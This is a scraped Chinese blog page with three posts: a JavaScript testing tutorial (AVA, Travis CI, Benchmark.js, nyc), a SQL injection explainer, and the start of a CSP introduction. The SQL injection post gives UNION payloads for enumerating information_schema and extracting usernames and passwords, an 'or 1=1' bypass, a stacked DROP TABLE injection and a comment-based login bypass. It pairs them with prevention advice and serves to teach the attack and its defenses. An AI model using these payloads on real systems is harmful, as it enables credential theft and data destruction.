-<p><a href="https://github.com/sindresorhus/ava" target="_blank" rel="noopener">AVA</a> 是 JavaScript 生态中最新潮的测试框架，其内置了 Babel，可以直接使用 ES6 语法，具有轻量高效、并发执行、强制隔离等优点，安装方法：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev ava</span><br></pre></td></tr></table></figure>
-<p>设置 <code>package.json</code> 中的 <code>scripts</code> 字段：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"scripts"</span>: &#123;</span><br><span class="line">        <span class="string">"test"</span>: <span class="string">"ava"</span>,</span><br><span class="line">        <span class="string">"test:watch"</span>: <span class="string">"ava --watch"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>运行：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm test</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line">npm test:watch</span><br></pre></td></tr></table></figure>
-<p>下面是一个基本的测试代码：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> test <span class="keyword">from</span> <span class="string">'ava'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fibonacci = <span class="function">(<span class="params">n</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">0</span> || n === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fibonacci(n - <span class="number">1</span>) + fibonacci(n - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test(<span class="string">'Test Fibonacci(0)'</span>, t =&gt; &#123;</span><br><span class="line">    t.is(fibonacci(<span class="number">0</span>), <span class="number">0</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">test(<span class="string">'Test Fibonacci(1)'</span>, t =&gt; &#123;</span><br><span class="line">    t.is(fibonacci(<span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// HOOK CALLS</span></span><br><span class="line">test.before(<span class="string">'Before'</span>, t =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'before'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">test.after(<span class="string">'After'</span>, t =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'after'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">test.beforeEach(<span class="string">'BeforeEach'</span>, t =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'   beforeEach'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">test.afterEach(<span class="string">'AfterEach'</span>, t =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'   afterEach'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>在上面的代码中，我们首先引入了 AVA 模块，然后创建了待测试的 <code>fibonacci</code> 函数，接下来是两个测试用例，最后是四个钩子方法：before() / after() / beforeEach() / afterEach()。</p>
-<p>AVA 提供了一下修饰方法来指定测试的执行方式：</p>
-<ul>
-<li><p><code>skip()</code>，跳过添加了 <code>skip()</code> 的测试用例</p>
-</li>
-<li><p><code>only()</code>，只执行添加了 <code>only()</code> 的测试用例</p>
-</li>
-<li><p><code>todo()</code>，占位标识符，表示将来需要添加的测试用例</p>
-</li>
-<li><p><code>serial()</code>，串行执行测试用例，默认情况下 AVA 会以并行的方式执行测试用例</p>
-</li>
-</ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test(<span class="string">'Test Fibonacci(0)'</span>, t =&gt; &#123;</span><br><span class="line">    t.is(fibonacci(<span class="number">0</span>), <span class="number">0</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>在上面代码回调函数中的 <code>t</code>，称为断言执行对象，该对象包含以下方法：</p>
-<ul>
-<li><p><code>t.end()</code>，结束测试，只在 <code>test.cb()</code> 中有效</p>
-</li>
-<li><p><code>t.plan(count)</code>，指定执行次数</p>
-</li>
-<li><p><code>t.pass([message])</code>，测试通过</p>
-</li>
-<li><p><code>t.fail([message])</code>，测试失败</p>
-</li>
-<li><p><code>t.ok(value, [message])</code>，断言 <code>value</code> 的值为真值</p>
-</li>
-<li><p><code>t.notOK(value, [message])</code>，断言 <code>value</code> 的值为假值</p>
-</li>
-<li><p><code>t.true(value, [message])</code>，断言 <code>value</code> 的值为 <code>true</code></p>
-</li>
-<li><p><code>t.false(value, [message])</code>，断言 <code>value</code> 的值为 <code>false</code></p>
-</li>
-<li><p><code>t.is(value, expected, [message])</code>，断言 <code>value === expected</code></p>
-</li>
-<li><p><code>t.not(value, expected, [message])</code>，断言 <code>value !== expected</code></p>
-</li>
-<li><p><code>t.same(value, expected, [message])</code>，断言 <code>value</code> 和 <code>expected</code> 深度相等</p>
-</li>
-<li><p><code>t.notSame(value, expected, [message])</code>，断言 <code>value</code> 和 <code>expected</code> 深度不等</p>
-</li>
-<li><p><code>t.throws(function | promise, [error, [message]])</code>，断言 <code>function</code> 抛出异常或 <code>promise</code>reject 错误</p>
-</li>
-<li><p><code>t.notThrows(function | promise, [message])</code>，断言 <code>function</code> 不会异常或 <code>promise</code> resolve</p>
-</li>
-<li><p><code>t.regex(contents, regex, [message])</code>，断言 <code>contents</code> 匹配 <code>regex</code></p>
-</li>
-<li><p><code>t.ifError(error, [message])</code>，断言 <code>error</code> 是假值</p>
-</li>
-</ul>
-<h3 id="Mock"><a href="#Mock" class="headerlink" title="Mock"></a>Mock</h3><p>Mock 主要用于单元测试中. 当一个测试的对象可能依赖其他 (也许复杂/多个) 的对象. 为了确保其行为不受其他对象的影响, 你可以通过模拟其他对象的行为来隔离你要测试的对象.</p>
-<p>当你要测试的单元依赖了一些很难纳入单元测试的情况时 (例如要测试的单元依赖数据库/文件操作/第三方服务 等情况的返回时), 使用 mock 是非常有用的. 简而言之, Mock 是模拟其他依赖的 behaviour.</p>
-<h3 id="常见测试工具"><a href="#常见测试工具" class="headerlink" title="常见测试工具"></a>常见测试工具</h3><ul>
-<li><a href="https://github.com/mochajs/mocha" target="_blank" rel="noopener">Mocha</a></li>
-<li><a href="https://github.com/avajs/ava" target="_blank" rel="noopener">ava</a></li>
-<li><a href="https://github.com/facebook/jest" target="_blank" rel="noopener">Jest</a></li>
-</ul>
-<h2 id="集成测试"><a href="#集成测试" class="headerlink" title="集成测试"></a>集成测试</h2><p>相对于专注微观模块的单元测试，集成测试是从宏观整体的角度发现问题，所以也称为组装测试和联合测试。<a href="https://travis-ci.org/" target="_blank" rel="noopener">Travis CI</a> 是一款优秀的持续集成工具，可以监听 Github 项目的更新，便于开源软件的集成测试。使用 Travis CI 需要在项目的根目录下创建 <code>.travis.yml</code> 配置文件（以 Node.js 为例）：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">language: node_js</span><br><span class="line"></span><br><span class="line">node_js:</span><br><span class="line">    - <span class="string">"6"</span></span><br><span class="line">    - <span class="string">"5"</span></span><br><span class="line"></span><br><span class="line">before_script:</span><br><span class="line"></span><br><span class="line">script:</span><br><span class="line">    - npm test</span><br><span class="line">    - node benchmark/index.js</span><br><span class="line"></span><br><span class="line">after_script:</span><br></pre></td></tr></table></figure>
-<p>默认情况下，Travis CI 会自动安装依赖并执行 <code>npm test</code> 命令，通过 <code>script</code> 字段可以自定义需要执行的命令，其完整的生命周期包括：</p>
-<ol>
-<li>Install <code>apt addons</code></li>
-<li><code>before_install</code></li>
-<li><code>install</code></li>
-<li><code>before_script</code></li>
-<li><code>script</code></li>
-<li><code>after_success</code> or <code>after_failure</code></li>
-<li>OPTIONAL <code>before_deploy</code></li>
-<li>OPTIONAL <code>deploy</code></li>
-<li>OPTIONAL <code>after_deploy</code></li>
-<li><code>after_script</code></li>
-</ol>
-<h2 id="基准测试"><a href="#基准测试" class="headerlink" title="基准测试"></a>基准测试</h2><p>基准测试使用严谨的测试方法、测试工具或测试系统评估目标模块的性能，常用于观测软硬件环境发生变化后的性能表现，其结果具有可复现性。在 Node.js 环境中最常用的基准测试工具是 <a href="https://benchmarkjs.com/docs" target="_blank" rel="noopener">Benchmark.js</a>，安装方式：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev benchmark</span><br></pre></td></tr></table></figure></p>
-<p>基本示例：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Benchmark = <span class="built_in">require</span>(<span class="string">'benchmark'</span>);</span><br><span class="line"><span class="keyword">const</span> suite = <span class="keyword">new</span> Benchmark.Suite;</span><br><span class="line"></span><br><span class="line">suite.add(<span class="string">'RegExp#test'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    /o/.test(<span class="string">'Hello World!'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.add(<span class="string">'String#indexOf'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="string">'Hello World!'</span>.indexOf(<span class="string">'o'</span>) &gt; <span class="number">-1</span>;</span><br><span class="line">&#125;)</span><br><span class="line">.on(<span class="string">'cycle'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">String</span>(event.target));</span><br><span class="line">&#125;)</span><br><span class="line">.on(<span class="string">'complete'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Fastest is '</span> + <span class="keyword">this</span>.filter(<span class="string">'fastest'</span>).map(<span class="string">'name'</span>));</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// run async</span></span><br><span class="line">.run(&#123; <span class="string">'async'</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure></p>
-<p>你可以将同一个功能的不同实现基于同一个标准来比较不同实现的速度, 从而得到最优解.</p>
-<p>黑盒级别的基准测试, 则推荐 <a href="https://httpd.apache.org/docs/2.4/programs/ab.html" target="_blank" rel="noopener">Apache ab</a> 以及 <a href="https://github.com/wg/wrk" target="_blank" rel="noopener">wrk</a> 等。:</p>
-<h2 id="代码覆盖率"><a href="#代码覆盖率" class="headerlink" title="代码覆盖率"></a>代码覆盖率</h2><p>  测试覆盖率 (Test Coverage) 是指代码中各项逻辑被测试覆盖到的比率, 比如 90% 的覆盖率, 是指代码中 90% 的情况都被测试覆盖到了.</p>
-<p>  覆盖率通常由四个维度贡献:</p>
-<ul>
-<li><p>行覆盖率 (line coverage) 是否每一行都执行了？</p>
-</li>
-<li><p>函数覆盖率 (function coverage) 是否每个函数都调用了？</p>
-</li>
-<li><p>分支覆盖率 (branch coverage) 是否每个if代码块都执行了？</p>
-</li>
-<li><p>语句覆盖率 (statement coverage) 是否每个语句都执行了？</p>
-</li>
-</ul>
-<p>常用的测试覆盖率框架 <a href="https://github.com/gotwarlost/istanbul" target="_blank" rel="noopener">istanbul</a>.</p>
-<p>覆盖率工具根据测试用例覆盖的代码行数和分支数来判断模块的完整性。AVA 推荐使用 <code>nyc</code> 测试代码覆盖率，安装 nyc：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install nyc --save-dev</span><br></pre></td></tr></table></figure>
-<p>修改 <code>.gitignore</code> 忽略相关文件：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node_modules</span><br><span class="line">coverage</span><br><span class="line">.nyc_output</span><br></pre></td></tr></table></figure></p>
-<p>修改 <code>package.json</code> 中的 <code>test</code> 字段：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"scripts"</span>: &#123;</span><br><span class="line">        <span class="string">"test"</span>: <span class="string">"nyc ava"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>执行 <code>npm test</code>，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  test-in-action (master) ✔ npm test</span><br><span class="line"></span><br><span class="line">&gt; test-in-action@1.0.0 test /Users/sean/Desktop/test-in-action</span><br><span class="line">&gt; nyc ava</span><br><span class="line"></span><br><span class="line">   2 passed</span><br><span class="line">----------|----------|----------|----------|----------|----------------|</span><br><span class="line">File      |  % Stmts | % Branch |  % Funcs |  % Lines |Uncovered Lines |</span><br><span class="line">----------|----------|----------|----------|----------|----------------|</span><br><span class="line">----------|----------|----------|----------|----------|----------------|</span><br><span class="line">All files |      100 |      100 |      100 |      100 |                |</span><br><span class="line">----------|----------|----------|----------|----------|----------------|</span><br></pre></td></tr></table></figure></p>
-<h2 id="压力测试"><a href="#压力测试" class="headerlink" title="压力测试"></a>压力测试</h2><p>压力测试 (Stress testing), 是保证系统稳定性的一种测试方法. 通过预估系统所需要承载的 QPS, TPS 等指标, 然后通过如 <a href="http://jmeter.apache.org/" target="_blank" rel="noopener">Jmeter</a> 等压测工具模拟相应的请求情况, 来验证当前应能能否达到目标.</p>
-<p>对于比较重要, 流量较高或者后期业务量会持续增长的系统, 进行压力测试是保证项目品质的重要环节. 常见的如负载是否均衡, 带宽是否合理, 以及磁盘 IO 网络 IO 等问题都可以通过比较极限的压力测试暴露出来.</p>
-<h2 id="Assert"><a href="#Assert" class="headerlink" title="Assert"></a>Assert</h2><p>断言 (Assert) 是快速判断并对不符合预期的情况进行报错的模块. 是将:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (condition) &#123;</span><br><span class="line">  throw new Error(&apos;Sth wrong&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>写成:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(!condition, &apos;Sth wrong&apos;);</span><br></pre></td></tr></table></figure>
-<p>等等情况的一种简化. 并且提供了丰富了 <code>equal</code> 判断, 对于对象类型也有深度/严格判断等情况支持.</p>
-<p>Node.js 中内置的 <code>assert</code> 模块也是属于断言模块的一种, 但是官方在文档中有注明, 该内置模块主要是用于内置代码编写时的基本断言需求, 并不是一个通用的断言库 (<strong>not intended to be used as a general purpose assertion library</strong>)</p>
-<h3 id="常见断言工具"><a href="#常见断言工具" class="headerlink" title="常见断言工具"></a>常见断言工具</h3><ul>
-<li><a href="https://github.com/chaijs/chai" target="_blank" rel="noopener">Chai</a></li>
-<li><a href="https://github.com/shouldjs/should.js" target="_blank" rel="noopener">should.js</a></li>
-</ul>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://ourjs.com/detail/5738493888feaf2d031d24fa" target="_blank" rel="noopener">http://ourjs.com/detail/5738493888feaf2d031d24fa</a><br><a href="https://elemefe.github.io/node-interview/#/sections/zh-cn/test?id=mock" target="_blank" rel="noopener">https://elemefe.github.io/node-interview/#/sections/zh-cn/test?id=mock</a></p>
-
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2017-02-23T06:45:23.000Z"><a href="/2017/02/23/网络安全/SQL注入/">2017-02-23</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2017/02/23/网络安全/SQL注入/">SQL注入</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h3 id="如何理解SQL注入（攻击）？"><a href="#如何理解SQL注入（攻击）？" class="headerlink" title="如何理解SQL注入（攻击）？"></a>如何理解SQL注入（攻击）？</h3><ol>
-<li>SQL注入是一种将SQL代码添加到输入参数中，传递到服务器解析并执行的一种攻击手法。</li>
-<li>SQL注入攻击是输入参数未经过滤，然后直接拼接到SQL语句当中解析，执行达到预想之外的一种行为，称之为SQL注入攻击。</li>
-</ol>
-<h3 id="SQL注入是怎么产生的？"><a href="#SQL注入是怎么产生的？" class="headerlink" title="SQL注入是怎么产生的？"></a>SQL注入是怎么产生的？</h3><ol>
-<li>WEB开发人员无法保证所有的输入都已经过滤</li>
-<li>攻击者利用发送给SQL服务器的输入参数构造可执行的SQL代码（可加入到get请求、post请求、http头信息、cookie中）</li>
-<li>数据库未做相应的安全配置</li>
-</ol>
-<h3 id="如何进行SQL注入攻击"><a href="#如何进行SQL注入攻击" class="headerlink" title="如何进行SQL注入攻击"></a>如何进行SQL注入攻击</h3><p>要想发动sql注入攻击，就要知道正在使用的系统数据库，不然就没法提取重要的数据。<br>首先从Web应用技术上就给我们提供了判断的线索：</p>
-<ul>
-<li>ASP和.NET：Microsoft SQL Server</li>
-<li>PHP：MySQL、PostgreSQL</li>
-<li>Java：Oracle、MySQL</li>
-</ul>
-<p>Web容器也给我们提供了线索，比如安装IIS作为服务器平台，后台数据及很有可能是Microsoft SQL Server，而允许Apache和PHP的Linux服务器就很有可能使用开源的数据库，比如MySQL和PostgreSQL。</p>
-<h5 id="基于错误识别数据库"><a href="#基于错误识别数据库" class="headerlink" title="基于错误识别数据库"></a>基于错误识别数据库</h5><p>大多数情况下，要了解后台是什么数据库，只需要看一条详细的错误信息即可。比如判断我们事例中使用的数据库，我们加个单引号。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error:You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''' at line 1</span></span><br></pre></td></tr></table></figure></p>
-<p>从错误信息中，我们就可以发现是MySQL。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e14'</span><br><span class="line"> [Microsoft][ODBC SQL Server Driver][SQL Server]Line 1:</span><br></pre></td></tr></table></figure>
-<p>上面错误信息可以发现是Microsoft SQL Server，如果错误信息开头是ORA，就可以判断数据库是Oracle，很简单，道理都是一样的，就不一一列举了。</p>
-<h6 id="UINON语句提取数据"><a href="#UINON语句提取数据" class="headerlink" title="UINON语句提取数据"></a>UINON语句提取数据</h6><p>UNION操作符可以合并两条或多条SELECT语句的查询结果，基本语法如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">column</span><span class="number">-1</span> <span class="keyword">column</span><span class="number">-2</span> <span class="keyword">from</span> <span class="keyword">table</span><span class="number">-1</span></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">column</span><span class="number">-1</span> <span class="keyword">column</span><span class="number">-2</span> <span class="keyword">from</span> <span class="keyword">table</span><span class="number">-2</span></span><br></pre></td></tr></table></figure></p>
-<h6 id="枚举数据库"><a href="#枚举数据库" class="headerlink" title="枚举数据库"></a>枚举数据库</h6><p>我们只以MySQL数据库为例了，枚举数据库并提取数据遵循一种层次化的方法，首先我们提取数据库名称，然后提取表，再到列，最后才是数据本身。要想获取远程数据库的表、列，就要访问专门保存描述各种数据库结构的表。通常将这些结构描述信息成为元数据。在MySQL中，这些表都保存在information_schema数据库中</p>
-<h6 id="第一步：提取数据库"><a href="#第一步：提取数据库" class="headerlink" title="第一步：提取数据库"></a>第一步：提取数据库</h6><p>在MySQL中，数据库名存放在information_schema数据库下schemata表schema_name字段中<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union <span class="keyword">select</span> <span class="literal">null</span>,schema_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure></p>
-<h6 id="第二步：提取表名"><a href="#第二步：提取表名" class="headerlink" title="第二步：提取表名"></a>第二步：提取表名</h6><p>在MySQL中，表名存放在information_schema数据库下tables表table_name字段中<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union <span class="keyword">select</span> <span class="literal">null</span>,table_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'ichunqiu'</span></span><br></pre></td></tr></table></figure></p>
-<h6 id="第三步：提取字段名"><a href="#第三步：提取字段名" class="headerlink" title="第三步：提取字段名"></a>第三步：提取字段名</h6><p>在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,column_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">and</span> table_schema=<span class="string">''</span></span><br></pre></td></tr></table></figure></p>
-<h6 id="第四步：提取数据"><a href="#第四步：提取数据" class="headerlink" title="第四步：提取数据"></a>第四步：提取数据</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span>,<span class="literal">null</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure>
-<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><h4 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h4><p>例如：在参数后面加上or 1=1，可返回所有数据，因为 or 1=1永远为真</p>
-<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>在参数后面加上：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">select</span> <span class="keyword">column</span><span class="number">-1</span> <span class="keyword">column</span><span class="number">-2</span> <span class="keyword">from</span> <span class="keyword">table</span><span class="number">-2</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="多语句注入"><a href="#多语句注入" class="headerlink" title="多语句注入"></a>多语句注入</h4><p>在参数后面加上：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> a; <span class="keyword">select</span> * <span class="keyword">from</span> tableb;</span><br></pre></td></tr></table></figure></p>
-<h4 id="字符串注册"><a href="#字符串注册" class="headerlink" title="字符串注册"></a>字符串注册</h4><p>‘#’：’#’后所有的字符串都会被当成注释来处理用户名输入：user’#（单引号闭合user左边的单引号），密码随意输入，如：111，然后点击提交按钮。等价于SQL语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> username = <span class="string">'user'</span>#<span class="string">'ADN password = '</span><span class="number">111</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="如何预防SQL注入"><a href="#如何预防SQL注入" class="headerlink" title="如何预防SQL注入"></a>如何预防SQL注入</h3><ol>
-<li>严格检查输入变量的类型和格式<br> 对于整数参数，加判断条件：不能为空、参数类型必须为数字<br> 对于字符串参数，可以使用正则表达式进行过滤：如：必须为[0-9a-zA-Z]范围内的字符串</li>
-<li>对URL进行编码</li>
-<li>对进入数据库的特殊字符（’”\尖括号&amp;*;等）进行转义处理，或编码转换</li>
-<li>所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中，即不要直接拼接SQL语句</li>
-<li>避免网站打印出SQL错误信息，比如类型错误、字段不匹配等，把代码里的SQL语句暴露出来，以防止攻击者利用这些错误信息进行SQL注入。</li>
-<li>利用sql的预编译机制<br> 把sql语句的模板（变量采用占位符进行占位）发送给数据库服务器，数据库服务器对sql语句的模板进行编译，编译之后根据语句的优化分析对相应的索引进行优化，在最终绑定参数时把相应的参数传送给数据库服务器，直接进行执行，节省了sql查询时间，以及数据库服务器的资源，达到一次编译、多次执行的目的，除此之外，还可以防止SQL注入。具体是怎样防止SQL注入的呢？实际上当将绑定的参数传到数据库服务器，服务器对参数进行编译，即填充到相应的占位符的过程中，做了转义操作。</li>
-</ol>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/github_36032947/article/details/78442189" target="_blank" rel="noopener">https://blog.csdn.net/github_36032947/article/details/78442189</a><br><a href="https://www.jianshu.com/p/ba35a7e1c67d" target="_blank" rel="noopener">https://www.jianshu.com/p/ba35a7e1c67d</a><br><a href="https://paper.seebug.org/15/" target="_blank" rel="noopener">https://paper.seebug.org/15/</a><br><a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md" target="_blank" rel="noopener">https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md</a></p>
-
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2017-02-20T06:45:23.000Z"><a href="/2017/02/20/网络安全/CSP简介/">2017-02-20</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2017/02/20/网络安全/CSP简介/">CSP简介</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <p>跨域脚本攻击 XSS是最常见、危害最大的网页安全漏洞。为了防止它们，要采取很多编程措施，非常麻烦。很多人提出，能不能根本上解决问题，浏览器自动禁止外部注入恶意脚本？这就是”网页安全政策”（Content Security Policy，缩写 CSP）的来历。</p>
-<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
-<p>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p>
-<p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/csp01.jpg" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &apos;self&apos;; object-src &apos;none&apos;;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure>
